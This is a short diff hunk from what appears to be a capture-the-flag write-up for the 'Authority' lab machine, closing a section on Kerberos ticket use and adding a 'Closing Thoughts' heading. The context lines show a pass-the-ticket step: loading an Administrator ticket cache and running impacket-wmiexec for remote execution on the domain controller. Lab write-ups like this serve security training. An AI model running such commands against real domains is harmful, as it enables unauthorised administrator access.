@@ -402,4 +402,4 @@ With Kerberos:
 2. Change the kerberos cache you're using with `export KRB5CCNAME=administrator.ccache` and double check if it worked with `echo $KRB5CCNAME` and `klist`
 3. run one of impacket tools that suits the ports you have access `impacket-wmiexec -k -no-pass AUTHORITY.HTB/Administrator@authority.authority.htb`
 
-
+## Closing Thoughts
